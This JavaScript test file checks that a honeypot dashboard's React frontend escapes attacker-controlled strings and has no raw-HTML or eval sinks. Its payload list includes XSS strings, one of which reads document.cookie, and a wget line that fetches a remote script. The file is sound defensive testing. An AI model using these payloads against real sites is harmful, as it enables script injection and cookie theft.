// Evidence that attacker-controlled honeypot strings (commands, usernames, URLs) cannot inject markup into the
// dashboard: no raw-HTML sinks exist in the source, and React escapes such strings in text and attributes,
// which is how HoneypotAnalytics renders commands ({c.command}) and MITRE names (title={tech.name}).
import test from 'node:test'
import assert from 'node:assert/strict'
import { readdirSync, readFileSync, statSync } from 'node:fs'
import { join, dirname } from 'node:path'
import { fileURLToPath } from 'node:url'
import { createElement } from 'react'
import { renderToStaticMarkup } from 'react-dom/server'

const SRC = join(dirname(fileURLToPath(import.meta.url)), '..', 'src')
const PAYLOADS = [
  '<img src=x onerror=alert(1)>',
  '"><script>alert(document.cookie)</script>',
  "wget http://x/a.sh' onmouseover='alert(1)",
  'javascript:alert(1)',
]

const sourceFiles = (dir) =>
  readdirSync(dir).flatMap((name) => {
    const path = join(dir, name)
    return statSync(path).isDirectory() ? sourceFiles(path) : /\.(jsx?|mjs)$/.test(name) ? [path] : []
  })

test('the frontend source has no raw-HTML or code-evaluation sinks', () => {
  const sinks = /dangerouslySetInnerHTML|\.innerHTML\s*=|\.outerHTML\s*=|insertAdjacentHTML|document\.write\(|\beval\(|new Function\(/
  const offenders = sourceFiles(SRC).filter((file) => sinks.test(readFileSync(file, 'utf8')))
  assert.deepEqual(offenders, [])
})

test('attacker strings rendered as text are escaped, never parsed as markup', () => {
  for (const payload of PAYLOADS) {
    const html = renderToStaticMarkup(createElement('span', null, payload))
    assert.ok(!html.includes('<img') && !html.includes('<script'), html)
    assert.equal(html.replace(/<\/?span>/g, '').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&quot;/g, '"').replace(/&#x27;/g, "'").replace(/&amp;/g, '&'), payload)
  }
})

test('attacker strings in attributes cannot break out of the attribute', () => {
  for (const payload of PAYLOADS) {
    const html = renderToStaticMarkup(createElement('span', { title: payload }, 'x'))
    assert.match(html, /^<span title="[^"]*">x<\/span>$/, html)
  }
})
